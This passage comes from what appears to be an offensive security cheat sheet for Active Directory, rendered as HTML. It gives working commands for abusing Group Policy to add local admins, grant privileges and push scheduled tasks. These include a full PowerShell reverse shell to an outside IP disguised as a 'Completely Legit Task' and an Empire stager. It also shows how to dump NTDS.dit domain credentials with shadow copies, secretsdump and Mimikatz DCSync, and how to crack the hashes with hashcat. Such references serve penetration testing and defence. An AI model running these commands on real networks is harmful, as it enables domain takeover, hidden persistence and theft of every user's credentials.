<a id="__codelineno-87-4" name="__codelineno-87-4" href="#__codelineno-87-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Add-LocalAdmin</span> <span class="n">-Identity</span> <span class="s1">&#39;Bobby&#39;</span> <span class="n">-GPOIdentity</span> <span class="s1">&#39;SuperSecureGPO&#39;</span>
<a id="__codelineno-87-5" name="__codelineno-87-5" href="#__codelineno-87-5"></a>
<a id="__codelineno-87-6" name="__codelineno-87-6" href="#__codelineno-87-6"></a><span class="c"># Assign a new right </span>
<a id="__codelineno-87-7" name="__codelineno-87-7" href="#__codelineno-87-7"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Add-UserRights</span> <span class="n">-Rights</span> <span class="s2">&quot;SeLoadDriverPrivilege&quot;</span><span class="p">,</span><span class="s2">&quot;SeDebugPrivilege&quot;</span> <span class="n">-Identity</span> <span class="s1">&#39;Bobby&#39;</span> <span class="n">-GPOIdentity</span> <span class="s1">&#39;SuperSecureGPO&#39;</span>
<a id="__codelineno-87-8" name="__codelineno-87-8" href="#__codelineno-87-8"></a>
<a id="__codelineno-87-9" name="__codelineno-87-9" href="#__codelineno-87-9"></a><span class="c"># Adding a New Computer/User script </span>
<a id="__codelineno-87-10" name="__codelineno-87-10" href="#__codelineno-87-10"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Add-ComputerScript</span><span class="p">/</span><span class="nb">Add-UserScript</span> <span class="n">-ScriptName</span> <span class="s1">&#39;EvilScript&#39;</span> <span class="n">-ScriptContent</span> <span class="p">$(</span><span class="nb">Get-Content</span> <span class="n">evil</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span> <span class="n">-GPOIdentity</span> <span class="s1">&#39;SuperSecureGPO&#39;</span>
<a id="__codelineno-87-11" name="__codelineno-87-11" href="#__codelineno-87-11"></a>
<a id="__codelineno-87-12" name="__codelineno-87-12" href="#__codelineno-87-12"></a><span class="c"># Create an immediate task </span>
<a id="__codelineno-87-13" name="__codelineno-87-13" href="#__codelineno-87-13"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Add-GPOImmediateTask</span> <span class="n">-TaskName</span> <span class="s1">&#39;eviltask&#39;</span> <span class="n">-Command</span> <span class="s1">&#39;powershell.exe /c&#39;</span> <span class="n">-CommandArguments</span> <span class="s2">&quot;&#39;</span><span class="p">$(</span><span class="nb">Get-Content</span> <span class="n">evil</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span><span class="s2">&#39;&quot;</span> <span class="n">-Author</span> <span class="n">Administrator</span> <span class="n">-Scope</span> <span class="n">Computer</span><span class="p">/</span><span class="n">User</span> <span class="n">-GPOIdentity</span> <span class="s1">&#39;SuperSecureGPO&#39;</span>
</code></pre></div>
<h3 id="abuse-gpo-with-pygpoabuse">Abuse GPO with pyGPOAbuse</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">Hackndo</span><span class="p">/</span><span class="n">pyGPOAbuse</span>
<a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>
<a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a><span class="c"># Add john user to local administrators group (Password: H4x00r123..)</span>
<a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a><span class="p">./</span><span class="n">pygpoabuse</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">user</span> <span class="n">-hashes</span> <span class="n">lm</span><span class="p">:</span><span class="n">nt</span> <span class="n">-gpo-id</span> <span class="s2">&quot;12345677-ABCD-9876-ABCD-123456789012&quot;</span>
<a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a>
<a id="__codelineno-88-6" name="__codelineno-88-6" href="#__codelineno-88-6"></a><span class="c"># Reverse shell example</span>
<a id="__codelineno-88-7" name="__codelineno-88-7" href="#__codelineno-88-7"></a><span class="p">./</span><span class="n">pygpoabuse</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">user</span> <span class="n">-hashes</span> <span class="n">lm</span><span class="p">:</span><span class="n">nt</span> <span class="n">-gpo-id</span> <span class="s2">&quot;12345677-ABCD-9876-ABCD-123456789012&quot;</span> <span class="p">\</span> 
<a id="__codelineno-88-8" name="__codelineno-88-8" href="#__codelineno-88-8"></a>    <span class="n">-powershell</span> <span class="p">\</span> 
<a id="__codelineno-88-9" name="__codelineno-88-9" href="#__codelineno-88-9"></a>    <span class="n">-command</span> <span class="s2">&quot;\$client = New-Object System.Net.Sockets.TCPClient(&#39;10.20.0.2&#39;,1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2&gt;&amp;1 | Out-String );\$sendback2 = \$sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()&quot;</span> <span class="p">\</span> 
<a id="__codelineno-88-10" name="__codelineno-88-10" href="#__codelineno-88-10"></a>    <span class="n">-taskname</span> <span class="s2">&quot;Completely Legit Task&quot;</span> <span class="p">\</span>
<a id="__codelineno-88-11" name="__codelineno-88-11" href="#__codelineno-88-11"></a>    <span class="n">-description</span> <span class="s2">&quot;Dis is legit, pliz no delete&quot;</span> <span class="p">\</span> 
<a id="__codelineno-88-12" name="__codelineno-88-12" href="#__codelineno-88-12"></a>    <span class="n">-user</span>
</code></pre></div>
<h3 id="abuse-gpo-with-powerview">Abuse GPO with PowerView</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="c"># Enumerate GPO</span>
<a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a><span class="nb">Get-NetGPO</span> <span class="p">|</span> <span class="p">%{</span><span class="nb">Get-ObjectAcl</span> <span class="n">-ResolveGUIDs</span> <span class="n">-Name</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span><span class="p">}</span>
<a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>
<a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a><span class="c"># New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO</span>
<a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a><span class="nb">New-GPOImmediateTask</span> <span class="n">-TaskName</span> <span class="n">Debugging</span> <span class="n">-GPODisplayName</span> <span class="n">VulnGPO</span> <span class="n">-CommandArguments</span> <span class="s1">&#39;-NoP -NonI -W Hidden -Enc AAAAAAA...&#39;</span> <span class="n">-Force</span>
</code></pre></div>
<h3 id="abuse-gpo-with-standin">Abuse GPO with StandIn</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="c"># Add a local administrator</span>
<a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-gpo</span> <span class="p">-</span><span class="n">-filter</span> <span class="n">Shards</span> <span class="p">-</span><span class="n">-localadmin</span> <span class="n">user002</span>
<a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>
<a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a><span class="c"># Set custom right to a user</span>
<a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-gpo</span> <span class="p">-</span><span class="n">-filter</span> <span class="n">Shards</span> <span class="p">-</span><span class="n">-setuserrights</span> <span class="n">user002</span> <span class="p">-</span><span class="n">-grant</span> <span class="s2">&quot;SeDebugPrivilege,SeLoadDriverPrivilege&quot;</span>
<a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a>
<a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a><span class="c"># Execute a custom command</span>
<a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-gpo</span> <span class="p">-</span><span class="n">-filter</span> <span class="n">Shards</span> <span class="p">-</span><span class="n">-tasktype</span> <span class="n">computer</span> <span class="p">-</span><span class="n">-taskname</span> <span class="n">Liber</span> <span class="p">-</span><span class="n">-author</span> <span class="s2">&quot;REDHOOK\Administrator&quot;</span> <span class="p">-</span><span class="n">-command</span> <span class="s2">&quot;C:\I\do\the\thing.exe&quot;</span> <span class="p">-</span><span class="n">-args</span> <span class="s2">&quot;with args&quot;</span>
</code></pre></div>
<h2 id="dumping-ad-domain-credentials">Dumping AD Domain Credentials</h2>
<p>You will need the following files to extract the ntds : 
- NTDS.dit file
- SYSTEM hive (<code>C:\Windows\System32\SYSTEM</code>)</p>
<p>Usually you can find the ntds in two locations : <code>systemroot\NTDS\ntds.dit</code> and <code>systemroot\System32\ntds.dit</code>.
- <code>systemroot\NTDS\ntds.dit</code> stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
- <code>systemroot\System32\ntds.dit</code> is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.</p>
<p>However you can change the location to a custom one, you will need to query the registry to get the current location.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">Parameters</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;DSA Database file&quot;</span>
</code></pre></div>
<h3 id="using-ndtsutil">Using ndtsutil</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a><span class="n">C</span><span class="p">:\&gt;</span><span class="n">ntdsutil</span>
<a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a><span class="n">ntdsutil</span><span class="p">:</span> <span class="n">activate</span> <span class="n">instance</span> <span class="n">ntds</span>
<a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a><span class="n">ntdsutil</span><span class="p">:</span> <span class="n">ifm</span>
<a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a><span class="n">ifm</span><span class="p">:</span> <span class="n">create</span> <span class="n">full</span> <span class="n">c</span><span class="p">:\</span><span class="n">pentest</span>
<a id="__codelineno-92-5" name="__codelineno-92-5" href="#__codelineno-92-5"></a><span class="n">ifm</span><span class="p">:</span> <span class="n">quit</span>
<a id="__codelineno-92-6" name="__codelineno-92-6" href="#__codelineno-92-6"></a><span class="n">ntdsutil</span><span class="p">:</span> <span class="n">quit</span>
</code></pre></div>
<p>or </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="n">ntdsutil</span> <span class="s2">&quot;ac i ntds&quot;</span> <span class="s2">&quot;ifm&quot;</span> <span class="s2">&quot;create full c:\temp&quot;</span> <span class="n">q</span> <span class="n">q</span>
</code></pre></div>
<h3 id="using-vshadow">Using Vshadow</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="n">vssadmin</span> <span class="n">create</span> <span class="n">shadow</span> <span class="p">/</span><span class="k">for</span><span class="p">=</span><span class="n">C</span> <span class="p">:</span>
<a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a><span class="nb">Copy </span><span class="n">Shadow_Copy_Volume_Name</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">c</span><span class="p">:\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span>
</code></pre></div>
<p>You can also use the Nishang script, available at : <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Copy-VSS</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a><span class="nb">Copy-VSS</span>
<a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a><span class="nb">Copy-VSS</span> <span class="n">-DestinationDir</span> <span class="n">C</span><span class="p">:\</span><span class="n">ShadowCopy</span><span class="p">\</span>
</code></pre></div>
<h3 id="using-vssadmin">Using vssadmin</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a><span class="n">vssadmin</span> <span class="n">create</span> <span class="n">shadow</span> <span class="p">/</span><span class="k">for</span><span class="p">=</span><span class="n">C</span><span class="p">:</span>
<a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a><span class="nb">copy </span><span class="p">\\?\</span><span class="n">GLOBALROOT</span><span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolumeShadowCopy1</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">NTDS</span><span class="p">.</span><span class="n">dit</span> <span class="n">C</span><span class="p">:\</span><span class="n">ShadowCopy</span>
<a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a><span class="nb">copy </span><span class="p">\\?\</span><span class="n">GLOBALROOT</span><span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolumeShadowCopy1</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">config</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">C</span><span class="p">:\</span><span class="n">ShadowCopy</span>
</code></pre></div>
<h3 id="using-diskshadow-a-windows-signed-binary">Using DiskShadow (a Windows signed binary)</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a><span class="n">diskshadow</span><span class="p">.</span><span class="n">txt</span> <span class="n">contains</span> <span class="p">:</span>
<a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a><span class="nb">set </span><span class="n">context</span> <span class="n">persistent</span> <span class="n">nowriters</span>
<a id="__codelineno-97-3" name="__codelineno-97-3" href="#__codelineno-97-3"></a><span class="n">add</span> <span class="n">volume</span> <span class="n">c</span><span class="p">:</span> <span class="k">alias</span> <span class="n">someAlias</span>
<a id="__codelineno-97-4" name="__codelineno-97-4" href="#__codelineno-97-4"></a><span class="n">create</span>
<a id="__codelineno-97-5" name="__codelineno-97-5" href="#__codelineno-97-5"></a><span class="n">expose</span> <span class="k">%</span><span class="n">someAlias</span><span class="p">%</span> <span class="n">z</span><span class="p">:</span>
<a id="__codelineno-97-6" name="__codelineno-97-6" href="#__codelineno-97-6"></a><span class="n">exec</span> <span class="s2">&quot;cmd.exe&quot;</span> <span class="p">/</span><span class="n">c</span> <span class="nb">copy </span><span class="n">z</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">c</span><span class="p">:\</span><span class="n">exfil</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span>
<a id="__codelineno-97-7" name="__codelineno-97-7" href="#__codelineno-97-7"></a><span class="n">delete</span> <span class="n">shadows</span> <span class="n">volume</span> <span class="k">%</span><span class="n">someAlias</span><span class="p">%</span>
<a id="__codelineno-97-8" name="__codelineno-97-8" href="#__codelineno-97-8"></a><span class="n">reset</span>
<a id="__codelineno-97-9" name="__codelineno-97-9" href="#__codelineno-97-9"></a>
<a id="__codelineno-97-10" name="__codelineno-97-10" href="#__codelineno-97-10"></a><span class="n">then</span><span class="p">:</span>
<a id="__codelineno-97-11" name="__codelineno-97-11" href="#__codelineno-97-11"></a><span class="n">NOTE</span> <span class="p">-</span> <span class="n">must</span> <span class="n">be</span> <span class="n">executed</span> <span class="n">from</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span>
<a id="__codelineno-97-12" name="__codelineno-97-12" href="#__codelineno-97-12"></a><span class="n">diskshadow</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">s</span>  <span class="n">c</span><span class="p">:\</span><span class="n">diskshadow</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-97-13" name="__codelineno-97-13" href="#__codelineno-97-13"></a><span class="nb">dir </span><span class="n">c</span><span class="p">:\</span><span class="n">exfil</span>
<a id="__codelineno-97-14" name="__codelineno-97-14" href="#__codelineno-97-14"></a><span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">c</span><span class="p">:\</span><span class="n">exfil</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">bak</span>
</code></pre></div>
<h3 id="using-esentutlexe">Using esentutl.exe</h3>
<p>Copy/extract a locked file such as the AD Database</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="n">esentutl</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">y</span> <span class="p">/</span><span class="n">vss</span> <span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="p">/</span><span class="n">d</span> <span class="n">c</span><span class="p">:\</span><span class="n">folder</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span>
</code></pre></div>
<h3 id="extract-hashes-from-ntdsdit">Extract hashes from ntds.dit</h3>
<p>then you need to use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump</a> to extract the hashes, use the <code>LOCAL</code> options to use it on a retrieved ntds.dit</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="n">secretsdump</span><span class="p">.</span><span class="na">py</span><span class="w"> </span><span class="o">-</span><span class="n">system</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">SYSTEM</span><span class="w"> </span><span class="o">-</span><span class="n">ntds</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ntds</span><span class="p">.</span><span class="na">dit</span><span class="w"> </span><span class="n">LOCAL</span>
</code></pre></div>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump</a> also works remotely</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a><span class="p">.</span><span class="o">/</span><span class="n">secretsdump</span><span class="p">.</span><span class="na">py</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">AD</span><span class="err">\</span><span class="n">administrator</span><span class="nd">@domain</span><span class="w"> </span><span class="o">-</span><span class="n">use</span><span class="o">-</span><span class="n">vss</span><span class="w"> </span><span class="o">-</span><span class="n">pwd</span><span class="o">-</span><span class="n">last</span><span class="o">-</span><span class="n">set</span><span class="w"> </span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">status</span><span class="w"> </span>
<a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a><span class="p">.</span><span class="o">/</span><span class="n">secretsdump</span><span class="p">.</span><span class="na">py</span><span class="w"> </span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mf">0f</span><span class="mi">49</span><span class="n">aab58dd8fb314e268c4c6a65dfc9</span><span class="w"> </span><span class="o">-</span><span class="n">just</span><span class="o">-</span><span class="n">dc</span><span class="w"> </span><span class="n">PENTESTLAB</span><span class="o">/</span><span class="n">dc</span><span class="err">\</span><span class="n">$</span><span class="err">@</span><span class="mf">10.0.0.1</span>
</code></pre></div>
<ul>
<li><code>-pwd-last-set</code>: Shows pwdLastSet attribute for each NTDS.DIT account.</li>
<li><code>-user-status</code>: Display whether or not the user is disabled.</li>
</ul>
<h3 id="alternatives-modules">Alternatives - modules</h3>
<p>Metasploit modules</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">domain_hashdump</span>
</code></pre></div>
<p>PowerSploit module</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="nb">Invoke-NinjaCopy</span> <span class="p">-</span><span class="n">-path</span> <span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="p">-</span><span class="n">-verbose</span> <span class="p">-</span><span class="n">-localdestination</span> <span class="n">c</span><span class="p">:\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span>
</code></pre></div>
<p>CrackMapExec module</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="n">cme</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">202</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="p">-</span><span class="n">-ntds</span> <span class="n">vss</span>
<a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a><span class="n">cme</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">202</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="p">-</span><span class="n">-ntds</span> <span class="n">drsuapi</span> <span class="c">#default</span>
</code></pre></div>
<h3 id="using-mimikatz-dcsync">Using Mimikatz DCSync</h3>
<p>Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="c"># DCSync only one user</span>
<a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a><span class="n">mimikatz</span><span class="c"># lsadump::dcsync /domain:htb.local /user:krbtgt</span>
<a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a>
<a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a><span class="c"># DCSync all users of the domain</span>
<a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a><span class="n">mimikatz</span><span class="c"># lsadump::dcsync /domain:htb.local /all /csv</span>
</code></pre></div>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Read-Only Domain Controllers are not allowed to pull password data for users by default.</p>
<h3 id="using-mimikatz-sekurlsa">Using Mimikatz sekurlsa</h3>
<p>Dumps credential data in an Active Directory domain when run on a Domain Controller.
<img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Requires administrator access with debug or Local SYSTEM rights</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">krbtgt</span>
<a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">krbtgt</span>
</code></pre></div>
<h3 id="crack-ntlm-hashes-with-hashcat">Crack NTLM hashes with hashcat</h3>
<p>Useful when you want to have the clear text password or when you need to make stats about weak passwords.</p>
<p>Recommended wordlists:
- <a href="https://weakpass.com/wordlist/90">Rockyou.txt</a>
- <a href="https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM)">Have I Been Pwned founds</a>
- <a href="https://weakpass.com/">Weakpass.com</a>
- Read More at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md">Methodology and Resources/Hash Cracking.md</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="c"># Basic wordlist</span>
<a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a><span class="c"># (-O) will Optimize for 32 characters or less passwords</span>
<a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a><span class="c"># (-w 4) will set the workload to &quot;Insane&quot; </span>
<a id="__codelineno-106-4" name="__codelineno-106-4" href="#__codelineno-106-4"></a><span class="p">$</span> <span class="n">hashcat64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-m</span> <span class="n">1000</span> <span class="n">-w</span> <span class="n">4</span> <span class="n">-O</span> <span class="n">-a</span> <span class="n">0</span> <span class="n">-o</span> <span class="n">pathtopotfile</span> <span class="n">pathtohashes</span> <span class="n">pathtodico</span> <span class="n">-r</span> <span class="n">myrules</span><span class="p">.</span><span class="n">rule</span> <span class="p">-</span><span class="n">-opencl-device-types</span> <span class="n">1</span><span class="p">,</span><span class="n">2</span>
<a id="__codelineno-106-5" name="__codelineno-106-5" href="#__codelineno-106-5"></a>
<a id="__codelineno-106-6" name="__codelineno-106-6" href="#__codelineno-106-6"></a><span class="c"># Generate a custom mask based on a wordlist</span>
<a id="__codelineno-106-7" name="__codelineno-106-7" href="#__codelineno-106-7"></a><span class="p">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">iphelix</span><span class="p">/</span><span class="n">pack</span><span class="p">/</span><span class="n">blob</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">README</span>
<a id="__codelineno-106-8" name="__codelineno-106-8" href="#__codelineno-106-8"></a><span class="p">$</span> <span class="n">python2</span> <span class="n">statsgen</span><span class="p">.</span><span class="n">py</span> <span class="p">../</span><span class="n">hashcat</span><span class="p">.</span><span class="n">potfile</span> <span class="n">-o</span> <span class="n">hashcat</span><span class="p">.</span><span class="n">mask</span>
<a id="__codelineno-106-9" name="__codelineno-106-9" href="#__codelineno-106-9"></a><span class="p">$</span> <span class="n">python2</span> <span class="n">maskgen</span><span class="p">.</span><span class="n">py</span> <span class="n">hashcat</span><span class="p">.</span><span class="n">mask</span> <span class="p">-</span><span class="n">-targettime</span> <span class="n">3600</span> <span class="p">-</span><span class="n">-optindex</span> <span class="n">-q</span> <span class="n">-o</span> <span class="n">hashcat_1H</span><span class="p">.</span><span class="n">hcmask</span>
</code></pre></div>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :
- <a href="https://hashmob.net">hashmob.net</a>
- <a href="https://crackstation.net">crackstation.net</a>
- <a href="https://hashes.com/en/decrypt/hash">hashes.com</a></p>
<h3 id="ntds-reversible-encryption">NTDS Reversible Encryption</h3>
<p><code>UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED</code> (<a href="http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm">0x00000080</a>), if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.</p>
<p>The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin.
This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.</p>
<ul>
<li>List users with "Store passwords using reversible encryption" enabled
    <div class="highlight"><pre><span></span><code><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="s1">&#39;userAccountControl -band 128&#39;</span> <span class="n">-Properties</span> <span class="n">userAccountControl</span>
</code></pre></div></li>
</ul>
